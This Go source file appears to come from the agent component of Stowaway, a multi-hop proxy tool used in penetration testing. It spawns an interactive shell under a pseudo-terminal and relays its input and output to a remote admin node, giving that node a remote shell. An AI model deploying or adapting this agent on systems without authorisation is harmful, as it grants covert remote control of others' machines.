//go:build !windows
// +build !windows

package handler

import (
	"errors"
	"os"
	"os/exec"
	"runtime"
	"sync"

	"Stowaway/agent/manager"
	"Stowaway/global"
	"Stowaway/protocol"

	"github.com/creack/pty"
)

type Terminal struct {
	session uint64
	ptmx    *os.File
	cmd     *exec.Cmd
	mu      sync.Mutex
	closed  bool
}

func newTerminal(session uint64) *Terminal {
	return &Terminal{session: session}
}

func (terminal *Terminal) start(cols, rows uint16) {
	var err error

	readyHeader := &protocol.Header{
		Sender:      global.G_Component.UUID,
		Accepter:    protocol.ADMIN_UUID,
		MessageType: protocol.TERMINALREADY,
		RouteLen:    uint32(len([]byte(protocol.TEMP_ROUTE))),
		Route:       protocol.TEMP_ROUTE,
	}

	dataHeader := &protocol.Header{
		Sender:      global.G_Component.UUID,
		Accepter:    protocol.ADMIN_UUID,
		MessageType: protocol.TERMINALDATA,
		RouteLen:    uint32(len([]byte(protocol.TEMP_ROUTE))),
		Route:       protocol.TEMP_ROUTE,
	}

	exitHeader := &protocol.Header{
		Sender:      global.G_Component.UUID,
		Accepter:    protocol.ADMIN_UUID,
		MessageType: protocol.TERMINALEXIT,
		RouteLen:    uint32(len([]byte(protocol.TEMP_ROUTE))),
		Route:       protocol.TEMP_ROUTE,
	}

	var sendMu sync.Mutex
	send := func(header *protocol.Header, mess interface{}) {
		sendMu.Lock()
		defer sendMu.Unlock()
		sMessage := protocol.NewUpMsg(global.G_Component.Conn, global.G_Component.Secret, global.G_Component.UUID)
		protocol.ConstructMessage(sMessage, header, mess, false)
		sMessage.SendMessage()
	}

	defer func() {
		if err != nil {
			ready := &protocol.TerminalReady{
				Session:  terminal.session,
				OK:       0,
				ErrorLen: uint64(len(err.Error())),
				Error:    err.Error(),
			}
			send(readyHeader, ready)
		}
	}()

	cmd := exec.Command(defaultTerminalShell(), "-i")
	cmd.Env = append(os.Environ(), "TERM=xterm-256color")
	terminal.mu.Lock()
	if terminal.closed {
		terminal.mu.Unlock()
		err = errors.New("terminal closed")
		return
	}
	terminal.cmd = cmd
	terminal.mu.Unlock()

	ws := &pty.Winsize{Cols: cols, Rows: rows}
	if ws.Cols == 0 {
		ws.Cols = 80
	}
	if ws.Rows == 0 {
		ws.Rows = 24
	}

	ptmx, err := pty.StartWithSize(cmd, ws)
	if err != nil {
		return
	}
	terminal.mu.Lock()
	if terminal.closed {
		terminal.mu.Unlock()
		_ = ptmx.Close()
		if cmd.Process != nil {
			_ = cmd.Process.Kill()
		}
		err = errors.New("terminal closed")
		return
	}
	terminal.ptmx = ptmx
	terminal.mu.Unlock()

	ready := &protocol.TerminalReady{Session: terminal.session, OK: 1}
	send(readyHeader, ready)

	go func() {
		_ = cmd.Wait()
		terminal.close()
		exit := &protocol.TerminalExit{Session: terminal.session, OK: 1}
		send(exitHeader, exit)
	}()

	buf := make([]byte, 4096)
	for {
		terminal.mu.Lock()
		ptmx := terminal.ptmx
		closed := terminal.closed
		terminal.mu.Unlock()
		if closed || ptmx == nil {
			return
		}

		n, readErr := ptmx.Read(buf)
		if n > 0 {
			data := append([]byte(nil), buf[:n]...)
			dataMess := &protocol.TerminalData{
				Session: terminal.session,
				DataLen: uint64(len(data)),
				Data:    data,
			}
			send(dataHeader, dataMess)
		}
		if readErr != nil {
			return
		}
	}
}

func defaultTerminalShell() string {
	if shell := os.Getenv("SHELL"); shell != "" {
		return shell
	}
	if runtime.GOOS == "darwin" {
		return "/bin/zsh"
	}
	if _, err := os.Stat("/bin/bash"); err == nil {
		return "/bin/bash"
	}
	return "/bin/sh"
}

func (terminal *Terminal) input(data []byte) {
	terminal.mu.Lock()
	ptmx := terminal.ptmx
	closed := terminal.closed
	terminal.mu.Unlock()
	if !closed && ptmx != nil {
		_, _ = ptmx.Write(data)
	}
}

func (terminal *Terminal) resize(cols, rows uint16) {
	terminal.mu.Lock()
	ptmx := terminal.ptmx
	closed := terminal.closed
	terminal.mu.Unlock()
	if closed || ptmx == nil || cols == 0 || rows == 0 {
		return
	}
	_ = pty.Setsize(ptmx, &pty.Winsize{Cols: cols, Rows: rows})
}

func (terminal *Terminal) close() {
	terminal.mu.Lock()
	terminal.closed = true
	ptmx := terminal.ptmx
	cmd := terminal.cmd
	terminal.ptmx = nil
	terminal.cmd = nil
	terminal.mu.Unlock()

	if ptmx != nil {
		_ = ptmx.Close()
	}
	if cmd != nil && cmd.Process != nil {
		_ = cmd.Process.Kill()
	}
}

func DispatchTerminalMess(mgr *manager.Manager) {
	var terminal *Terminal

	for {
		message := <-mgr.TerminalManager.TerminalMessChan

		switch mess := message.(type) {
		case *protocol.TerminalStart:
			if terminal != nil {
				terminal.close()
			}
			terminal = newTerminal(mess.Session)
			go terminal.start(mess.Cols, mess.Rows)
		case *protocol.TerminalData:
			if terminal != nil && terminal.session == mess.Session {
				terminal.input(mess.Data)
			}
		case *protocol.TerminalResize:
			if terminal != nil && terminal.session == mess.Session {
				terminal.resize(mess.Cols, mess.Rows)
			}
		case *protocol.TerminalExit:
			if terminal != nil && terminal.session == mess.Session {
				terminal.close()
				terminal = nil
			}
		}
	}
}
